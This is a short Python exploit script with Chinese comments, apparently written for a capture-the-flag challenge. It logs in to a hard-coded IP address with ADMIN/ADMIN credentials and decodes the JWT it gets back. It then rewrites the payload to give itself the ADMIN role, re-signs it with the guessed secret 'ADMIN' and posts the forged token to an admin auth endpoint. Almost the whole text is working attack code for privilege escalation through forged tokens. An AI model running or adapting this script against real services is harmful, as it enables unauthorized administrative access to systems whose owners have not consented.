import requests
import re
import  jwt
import base64

def ExpStr(str1):#得到字符串，修改为ADMIN，并且拼接exp

     # str1 = '{"userName":"ADMIN","pwd":"ADMIN","userRole":"GUEST","exp":1599291838}'
     str1 = str1.replace("{",'').replace("}","")
     str1 = str1.replace('\"','')
     a = re.findall(r"159.*",str1)
     b = {'userName':'ADMIN','pwd':'ADMIN', 'userRole':'ADMIN'}
     c = str(a).replace('[','').replace(']','').replace('\'','')
     b['exp']=c  
     return b


url1 = "http://117.51.136.197/admin/login"
url2 = "http://117.51.136.197/admin/auth"

a = {'username':'ADMIN','pwd':'ADMIN'}   
b = requests.post(url1,data=a)
c = re.findall(r'ey.*\"',b.text)
d  = c[0]
e = str(d)
e = e.replace('"','')
g = e.split('.')
# 分成三分，修好中间那份
aa = g[1]
dd = base64.b64decode((aa+'==').encode('utf-8'))
dd1  = str(dd).replace("\'",'')
dd = dd1[1:]
dd2 = ExpStr(dd)
headers = {
    'alg': "HS256",  # 声明所使用的算法
}

jwt_token = jwt.encode(dd2,  # payload, 有效载体
                       "ADMIN",  # 进行加密签名的密钥
                       algorithm="HS256",  # 指明签名算法方式, 默认也是HS256
                       headers=headers  # json web token 数据结构包含两部分, payload(有效载体), headers(标头)
                       ).decode('ascii')  # python3 编码后得到 bytes, 再进行解码(指明解码的格式), 得到一个str

a['token']=jwt_token
f = requests.post(url2,data=a)

print(f.text)


